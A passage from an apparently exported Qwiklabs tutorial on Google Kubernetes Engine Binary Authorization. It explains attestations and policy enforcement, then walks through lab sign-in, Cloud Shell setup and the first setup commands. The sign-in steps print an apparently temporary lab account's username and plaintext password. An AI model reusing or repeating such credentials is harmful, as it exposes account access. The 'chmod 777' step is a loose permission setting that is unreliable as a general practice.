verified images are integrated into the build-and-release process.</span></p><p><span>This lab deploys a </span><a href='https://cloud.google.com/kubernetes-engine/'><span>Kubernetes Engine</span></a><span> Cluster with the Binary Authorization feature enabled demonstrates how to allowlist approved container registries, and walks you through the process of creating and running a signed container.</span></p><p><span>This lab was created by GKE Helmsman engineers to give you a better understanding of GKE Binary Authorization. We encourage any one to contribute to our assets!</span></p><h2 id='architecture-5'><span>Architecture</span></h2><p><span>The Binary Authorization and Container Analysis APIs are based upon the open-source projects Grafeas and Kritis.</span></p><ul><li><p><span>Grafeas defines an API spec for managing metadata about software resources, such as container images, Virtual Machine (VM) images, JAR files, and scripts. You can use Grafeas to define and aggregate information about your project’s components.</span></p></li><li><p><span>Kritis defines an API for ensuring a deployment is prevented unless the artifact (container image) is conformant to central policy and optionally has the necessary attestations present.</span></p></li></ul><p><span>In a simplified container deployment pipeline such as this:</span></p><p><img src="images\%2F23XvJfZJKvYRYkgWMwl8JHpZKz6d52x4%2B%2Fi%2BxZ3cOE%3D" referrerpolicy="no-referrer" alt="Deployment pipeline"></p><p><span>The container goes through at least 4 steps:</span></p><ol start='' ><li><p><span>The source code for creating the container is stored in source control.</span></p></li><li><p><span>Upon committing a change to source control, the container is built and tested.</span></p></li><li><p><span>If the build and test steps are completed, the container image artifact is then placed in a central container registry, ready for deployment.</span></p></li><li><p><span>When a deployment of that container version is submitted to the Kubernetes API, the container runtime will pull that container image from the container registry and run it as a pod.</span></p></li></ol><p><span>In a container build pipeline, there are opportunities to inject additional processes to signify or &quot;attest&quot; that each step was completed successfully. Examples include running unit tests, source control analysis checks, licensing verification, vulnerability analysis, and more. Each step could be given the power or &quot;attestation authority&quot; to sign for that step being completed. An &quot;attestation authority&quot; is a human or system with the correct PGP key and the ability to register that &quot;attestation&quot; with the Container Analysis API.</span></p><p><span>By using separate PGP keys for each step, each attestation step could be performed by different humans, systems, or build steps in the pipeline (a). Each PGP key is associated with an &quot;attestation note&quot; which is stored in the Container Analysis API. When a build step &quot;signs&quot; an image, a snippet of JSON metadata about that image is signed via PGP and that signed snippet is submitted to the API as a &quot;note occurrence&quot;.</span></p><p><img src="images\RXPfaDeQ1Mv%2Bs2RYXmRFIDD%2Be1AoKAf9qEOD9m5t%2F80%3D" referrerpolicy="no-referrer" alt="Attestation diagram"></p><p><span>(b).Once the container image has been built and the necessary attestations have been stored centrally, they are available for being queried as a part of a policy decision process. In this case, a </span><a href='https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/'><span>Kubernetes Admission Controller</span></a><span>, upon receiving an API request to </span><code>create</code><span> or </span><code>update</code><span> a Pod:</span></p><ol start='' ><li><p><span>Send a WebHook to the Binary Authorization API for a policy decision.</span></p></li><li><p><span>The Binary Authorization policy is then consulted.</span></p></li><li><p><span>If necessary, the Container Analysis API is also queried for the necessary attestation occurrences.</span></p></li><li><p><span>If the container image conforms to the policy, it is allowed to run.</span></p></li><li><p><span>If the container image fails to meet the policy, an error is presented to the API client with a message describing why it was prevented.</span></p></li></ol><p><img src="images\2eczz6ago2COUKvuw9adq64v0g1SFqVaRTar7mLyTSc%3D" referrerpolicy="no-referrer" alt="Enfore diagram"></p><h2 id='setup-and-requirements-29'><span>Setup and requirements</span></h2><h3 id='before-you-click-the-start-lab-button-15'><span>Before you click the Start Lab button</span></h3><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources are made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.</span></p><ul><li><p><span>Time to complete the lab—remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.</span></p><h3 id='how-to-start-your-lab-and-sign-in-to-the-google-cloud-console-10'><span>How to start your lab and sign in to the Google Cloud console</span></h3><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:</span></p><ul><li><p><span>The Open Google Cloud console button</span></p></li><li><p><span>Time remaining</span></p></li><li><p><span>The temporary credentials that you must use for this lab</span></p></li><li><p><span>Other information, if needed, to step through this lab</span></p></li></ul></li><li><p><span>Click </span><strong><span>Open Google Cloud console</span></strong><span> (or right-click and select </span><strong><span>Open Link in Incognito Window</span></strong><span> if you are running the Chrome browser).</span></p><p><span>The lab spins up resources, and then opens another tab that shows the Sign in page.</span></p><p><span>*</span><strong><span>Tip:</span><span>*</span></strong><span> Arrange the tabs in separate windows, side-by-side.</span></p><p><strong><span>Note:</span></strong><span> If you see the </span><strong><span>Choose an account</span></strong><span> dialog, click </span><strong><span>Use Another Account</span></strong><span>.</span></p></li><li><p><span>If necessary, copy the </span><strong><span>Username</span></strong><span> below and paste it into the </span><strong><span>Sign in</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student-02-e164b91bf60d@qwiklabs.net</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Username in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Copy the </span><strong><span>Password</span></strong><span> below and paste it into the </span><strong><span>Welcome</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">7ZUIm6rpni18</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Password in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p><p><strong><span>Important:</span></strong><span> You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.</span></p><p><strong><span>Note:</span></strong><span> Using your own Google Cloud account for this lab may incur extra charges.</span></p></li><li><p><span>Click through the subsequent pages:</span></p><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul></li></ol><p><span>After a few moments, the Google Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> To access Google Cloud products and services, click the </span><strong><span>Navigation menu</span></strong><span> or type the service or product name in the </span><strong><span>Search</span></strong><span> field. </span><img src="images\9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D" referrerpolicy="no-referrer" alt="Navigation menu icon and Search field"></p><h3 id='activate-cloud-shell-5'><span>Activate Cloud Shell</span></h3><p><span>Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud. Cloud Shell provides command-line access to your Google Cloud resources.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Activate Cloud Shell</span></strong><span> </span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span> at the top of the Google Cloud console.</span></p></li><li><p><span>Click through the following windows:</span></p><ul><li><p><span>Continue through the Cloud Shell information window.</span></p></li><li><p><span>Authorize Cloud Shell to use your credentials to make Google Cloud API calls.</span></p></li></ul></li></ol><p><span>When you are connected, you are already authenticated, and the project is set to your </span><strong><span>Project_ID</span></strong><span>, </span><code>qwiklabs-gcp-03-c7ed025791a3</code><span>. The output contains a line that declares the </span><strong><span>Project_ID</span></strong><span> for this session:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Your Cloud Platform project in this session is set to qwiklabs-gcp-03-c7ed025791a3</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><code>gcloud</code><span> is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.</span></p><ol start='' ><li><p><span>(Optional) You can list the active account name with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Authorize</span></strong><span>.</span></p></li></ol><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACTIVE: *</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACCOUNT: student-02-e164b91bf60d@qwiklabs.net</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">To set the active account, run:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  $ gcloud config set account `ACCOUNT`</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><ol start='' ><li><p><span>(Optional) You can list the project ID with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = qwiklabs-gcp-03-c7ed025791a3</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> For full documentation of </span><code>gcloud</code><span>, in Google Cloud, refer to </span><a href='https://cloud.google.com/sdk/gcloud'><span>the gcloud CLI overview guide</span></a><span>.</span></p><h2 id='task-1-copy-resources'><span>Task 1. Copy resources</span></h2><ol start='' ><li><p><span>Now, you will copy the resources needed for this lab by running:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil -m cp -r gs://spls/gke-binary-auth/* .</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Go into the directory for this demo:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cd gke-binary-auth-demo</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><h3 id='set-your-region-and-zone-2'><span>Set your region and zone</span></h3><p><span>Certain Compute Engine resources live in regions and zones. A region is a specific geographical location where you can run your resources. Each region has one or more zones.</span></p><p><strong><span>Note</span></strong><span>: Learn more about regions and zones and see a complete list in </span><a href='https://cloud.google.com/compute/docs/regions-zones/'><span>Regions &amp; Zones documentation</span></a><span>.</span></p><p><span>Run the following to set a region and zone for your lab (you can use the region/zone that&#39;s best for you):</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config set compute/region europe-west4</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config set compute/zone europe-west4-c</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><h3 id='updating-files-permissions'><span>Updating files permissions</span></h3><ul><li><p><span>Now, make some files readable, writable, and executable for resources needed for this lab:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">chmod +x create.sh</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">chmod +x delete.sh</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">chmod 777 validate.sh</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><h2 id='task-2-set-default-cluster-version'><span>Task 2. Set default cluster version</span></h2><ul><li><p><span>Change the </span><code>create.sh</code><span>&#39;s </span><strong><span>GKE_VERSION</span></strong><span> variable to </span><code>defaultClusterVersion</code><span>:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sed -i 's/validMasterVersions\[0\]/defaultClusterVersion/g' ./create.sh</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> The default cluster version will be compatible with other dependencies in this lab.</span></p><h2 id='task-3-deployment-steps'><span>Task 3. Deployment steps</span></h2><p><strong><span>Note:</span></strong><span> The following 